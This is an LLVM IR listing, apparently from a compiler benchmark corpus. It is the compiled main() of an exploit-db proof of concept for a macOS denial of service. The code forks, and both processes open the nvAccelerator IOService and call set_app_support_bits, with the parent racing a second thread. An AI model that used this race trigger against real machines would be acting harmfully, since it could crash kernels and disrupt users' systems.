; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44847.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44847.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [14 x i8] c"nvAccelerator\00", align 1
@MACH_PORT_NULL = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"got service: 0x%x\0A\00", align 1
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [26 x i8] c"unable to open ioservice\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"got service\0A\00", align 1
@thread_func = common dso_local global i32 0, align 4
@running = common dso_local global i32 0, align 4
@go = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = call i32 (...) @fork()
  store i32 %15, i32* %6, align 4
  %16 = load i32, i32* %6, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %20

18:                                               ; preds = %2
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %87

20:                                               ; preds = %2
  %21 = load i32, i32* %6, align 4
  %22 = icmp ne i32 %21, 0
  br i1 %22, label %23, label %61

23:                                               ; preds = %20
  %24 = load i32, i32* @kIOMasterPortDefault, align 4
  %25 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i64 @IOServiceGetMatchingService(i32 %24, i32 %25)
  store i64 %26, i64* %7, align 8
  %27 = load i64, i64* %7, align 8
  %28 = load i64, i64* @MACH_PORT_NULL, align 8
  %29 = icmp eq i64 %27, %28
  br i1 %29, label %30, label %32

30:                                               ; preds = %23
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %87

32:                                               ; preds = %23
  %33 = load i64, i64* %7, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i64 %33)
  %35 = load i64, i64* @MACH_PORT_NULL, align 8
  store i64 %35, i64* %8, align 8
  %36 = load i64, i64* %7, align 8
  %37 = call i32 (...) @mach_task_self()
  %38 = call i64 @IOServiceOpen(i64 %36, i32 %37, i32 5, i64* %8)
  store i64 %38, i64* %9, align 8
  %39 = load i64, i64* %9, align 8
  %40 = load i64, i64* @KERN_SUCCESS, align 8
  %41 = icmp ne i64 %39, %40
  br i1 %41, label %42, label %44

42:                                               ; preds = %32
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %87

44:                                               ; preds = %32
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %46 = load i32, i32* @thread_func, align 4
  %47 = load i64, i64* %8, align 8
  %48 = inttoptr i64 %47 to i8*
  %49 = call i32 @pthread_create(i32* %10, i32* null, i32 %46, i8* %48)
  br label %50

50:                                               ; preds = %54, %44
  %51 = load i32, i32* @running, align 4
  %52 = icmp ne i32 %51, 0
  %53 = xor i1 %52, true
  br i1 %53, label %54, label %55

54:                                               ; preds = %50
  br label %50

55:                                               ; preds = %50
  store i32 1, i32* @go, align 4
  %56 = load i64, i64* %8, align 8
  %57 = call i32 @set_app_support_bits(i64 %56)
  %58 = load i32, i32* %10, align 4
  %59 = call i32 @pthread_join(i32 %58, i32* null)
  store i32 0, i32* %11, align 4
  %60 = call i32 @wait(i32* %11)
  br label %86

61:                                               ; preds = %20
  %62 = load i32, i32* @kIOMasterPortDefault, align 4
  %63 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %64 = call i64 @IOServiceGetMatchingService(i32 %62, i32 %63)
  store i64 %64, i64* %12, align 8
  %65 = load i64, i64* %12, align 8
  %66 = load i64, i64* @MACH_PORT_NULL, align 8
  %67 = icmp eq i64 %65, %66
  br i1 %67, label %68, label %70

68:                                               ; preds = %61
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %87

70:                                               ; preds = %61
  %71 = load i64, i64* %12, align 8
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i64 %71)
  %73 = load i64, i64* @MACH_PORT_NULL, align 8
  store i64 %73, i64* %13, align 8
  %74 = load i64, i64* %12, align 8
  %75 = call i32 (...) @mach_task_self()
  %76 = call i64 @IOServiceOpen(i64 %74, i32 %75, i32 5, i64* %13)
  store i64 %76, i64* %14, align 8
  %77 = load i64, i64* %14, align 8
  %78 = load i64, i64* @KERN_SUCCESS, align 8
  %79 = icmp ne i64 %77, %78
  br i1 %79, label %80, label %82

80:                                               ; preds = %70
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %87

82:                                               ; preds = %70
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %84 = load i64, i64* %13, align 8
  %85 = call i32 @set_app_support_bits(i64 %84)
  br label %86

86:                                               ; preds = %82, %55
  store i32 0, i32* %3, align 4
  br label %87

87:                                               ; preds = %86, %80, %68, %42, %30, %18
  %88 = load i32, i32* %3, align 4
  ret i32 %88
}

declare dso_local i32 @fork(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i64*) #1

declare dso_local i32 @mach_task_self(...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i8*) #1

declare dso_local i32 @set_app_support_bits(i64) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

declare dso_local i32 @wait(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
